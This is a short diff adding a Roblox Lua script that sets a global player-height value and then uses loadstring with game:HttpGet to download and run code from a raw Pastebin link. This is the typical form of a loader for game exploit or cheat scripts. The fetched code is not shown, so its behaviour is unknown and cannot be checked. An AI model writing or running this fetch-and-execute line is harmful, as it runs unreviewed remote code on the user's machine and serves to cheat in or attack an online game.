@@ -1,0 +1,3 @@
+_G.PlayerHeight = CFrame.new(0, 15, 0)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/32bRFCHw"))()
